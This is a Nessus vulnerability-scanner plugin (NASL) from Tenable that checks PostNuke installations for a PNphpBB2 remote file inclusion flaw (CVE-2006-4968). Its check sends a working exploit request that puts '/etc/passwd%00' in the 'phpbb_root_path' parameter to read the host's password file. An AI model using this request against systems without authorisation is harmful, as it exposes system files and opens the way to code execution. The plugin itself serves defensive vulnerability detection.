#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(21145);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2006-4968");
  script_osvdb_id(30830);

  script_name(english:"PostNuke PNphpBB2 includes/functions_admin.php phpbb_root_path Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a file with PNphpBB2 Module");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a remote
file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"The installation of PostNuke on the remote host includes a version of
the PNphpBB2 module that fails to sanitize input to the
'phpbb_root_path' parameter of the 'includes/functions_admin.php'
script before using it in a PHP 'include_once()' function.  Provided
PHP's 'register_globals' setting is enabled, an unauthenticated
attacker may be able to exploit this issue to view arbitrary files or
to execute arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://securitytracker.com/id?1016912" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to PNphpBB2 version 1.2h rc3 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");


 script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/27");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/09/18");
 script_cvs_date("$Date: 2017/04/25 20:29:05 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:postnuke_software_foundation:pnphpbb");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006-2017 Tenable Network Security, Inc.");

  script_dependencies("postnuke_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/postnuke");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/postnuke"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  r = http_send_recv3(method:"GET", port:port,
    item:string(
      dir, "/modules/PNphpBB2/includes/functions_admin.php?",
      "phpbb_root_path=", file));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access and/or remote file inclusion might still work.
    egrep(pattern:"main\(/etc/passwd\\0includes.+ failed to open stream", string:res) ||
    egrep(pattern:"Failed opening '/etc/passwd\\0includes'", string:res)
  )
  {
    if (egrep(pattern:"root:.*:0:[01]:", string:res))
      report = string(
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = NULL;

    security_warning(port:port, extra:report);
    exit(0);
  }
}
